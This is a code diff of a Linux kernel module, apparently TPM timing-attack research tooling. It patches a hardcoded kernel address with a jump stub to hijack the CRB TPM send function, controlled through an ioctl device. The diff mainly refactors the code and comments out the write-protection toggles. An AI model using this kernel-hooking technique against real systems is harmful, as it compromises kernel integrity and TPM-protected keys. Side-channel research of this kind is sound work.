@@ -1,14 +1,12 @@
 #include <linux/module.h>
 #include <linux/miscdevice.h>
 #include <linux/uaccess.h>
-#include <linux/acpi.h>
-#include <linux/highmem.h>
-#include <linux/rculist.h>
-#include <linux/pm_runtime.h>
 #include <linux/io.h>
 #include <linux/fs.h>
 #include <linux/tpm.h>
-#include "tpmttl.h"
+
+#include "../tpmttl.h"
+
 
 unsigned long long pcrb_send = 0xffffffff81b2fb00;
 
@@ -58,6 +56,17 @@ struct crb_priv {
 
 #define	TPM_STS(l)			(0x0018 | ((l) << 12))
 
+static const struct file_operations tpmttl_fops = {
+  .owner = THIS_MODULE,
+  .unlocked_ioctl = tpmttl_ioctl,
+};
+
+static struct miscdevice tpmttl_miscdev = {
+  .minor = MISC_DYNAMIC_MINOR,
+  .name = "tpmttl",
+  .fops = &tpmttl_fops,
+};
+
 
 static noinline int internal_crb_send_handler(struct tpm_chip *chip, u8 *buf, size_t len);
 static int crb_send_handler(struct tpm_chip *chip, u8 *buf, size_t len);
@@ -69,8 +78,8 @@ unsigned long long requestcnt = 0;
 static void enable_attack_stub()
 {
   requestcnt = 0;
-  unsigned int target_addr;  
-  write_cr0(read_cr0() & (~X86_CR0_WP));
+  unsigned int target_addr;
+  // write_cr0(read_cr0() & (~X86_CR0_WP));
 
   target_addr = crb_send_handler - pcrb_send - 5;  
   jmp_stub[1] = ((char*)&target_addr)[0];
@@ -79,21 +88,23 @@ static void enable_attack_stub()
   jmp_stub[4] = ((char*)&target_addr)[3];
   memcpy((void*)pcrb_send, jmp_stub, sizeof(jmp_stub));
 
-  write_cr0(read_cr0() | X86_CR0_WP); 
+  // write_cr0(read_cr0() | X86_CR0_WP);
  
   printk("TPMTTL: ENABLED\n");
 }
 
+
 static void disable_attack_stub()
 {  
-  write_cr0(read_cr0() & (~X86_CR0_WP));
+  // write_cr0(read_cr0() & (~X86_CR0_WP));
 
   memcpy((void*)pcrb_send, nop_stub, sizeof(nop_stub));  
 
-  write_cr0(read_cr0() | X86_CR0_WP); 
+  // write_cr0(read_cr0() | X86_CR0_WP);
 
   printk("TPMTTL: DISABLED\n");
 }
+
 
 static long ioctl_uninstall_timer(struct file *filep, unsigned int cmd, unsigned long arg)
 {
@@ -101,11 +112,13 @@ static long ioctl_uninstall_timer(struct file *filep, unsigned int cmd, unsigned
   return 0;
 }
 
+
 static long ioctl_install_timer(struct file *filep, unsigned int cmd, unsigned long arg)
 {
   enable_attack_stub();
   return 0;
 }
+
 
 static long ioctl_read(struct file *filep, unsigned int cmd, unsigned long arg)
 {
@@ -119,7 +132,9 @@ static long ioctl_read(struct file *filep, unsigned int cmd, unsigned long arg)
   return 0;
 }
 
+
 typedef long (*tpmttl_ioctl_t)(struct file *filep, unsigned int cmd, unsigned long arg);
+
 long tpmttl_ioctl(struct file *filep, unsigned int cmd, unsigned long arg)
 {
   struct tpmttl_generic_param data;
@@ -190,18 +205,6 @@ static int crb_send_handler(struct tpm_chip *chip, u8 *buf, size_t len)
 {
   return internal_crb_send_handler(chip, buf, len);
 }
-
-
-static const struct file_operations tpmttl_fops = {
-  .owner = THIS_MODULE,
-  .unlocked_ioctl = tpmttl_ioctl,
-};
-
-static struct miscdevice tpmttl_miscdev = {
-  .minor = MISC_DYNAMIC_MINOR,
-  .name = "tpmttl",
-  .fops = &tpmttl_fops,
-};
 
 
 static int tpmttl_init(void)
